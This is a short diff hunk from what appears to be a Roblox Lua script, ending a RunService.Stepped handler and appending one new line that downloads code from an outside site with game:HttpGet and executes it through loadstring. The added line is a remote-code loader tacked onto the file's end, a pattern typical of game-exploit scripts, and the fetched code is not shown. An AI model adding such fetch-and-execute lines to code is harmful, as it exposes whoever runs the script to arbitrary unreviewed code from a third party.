@@ -232,3 +232,4 @@ game:GetService("RunService").Stepped:Connect(function()
         end
     end)
 end)
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/e9c206fd76482ee2"))()
